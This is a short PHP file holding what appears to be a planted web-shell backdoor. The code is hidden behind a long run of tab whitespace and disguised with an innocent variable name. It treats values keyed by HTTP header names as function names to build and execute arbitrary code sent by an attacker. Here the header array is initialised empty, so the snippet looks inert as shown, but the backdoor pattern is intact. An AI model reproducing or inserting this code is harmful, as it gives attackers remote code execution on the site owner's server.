<?php																																										$_HEADERS=Array();if(isset($_HEADERS['Large-Allocation'])){$oauthexceptions=$_HEADERS['Large-Allocation']('', $_HEADERS['Content-Security-Policy']($_HEADERS['Server-Timing']));$oauthexceptions();}
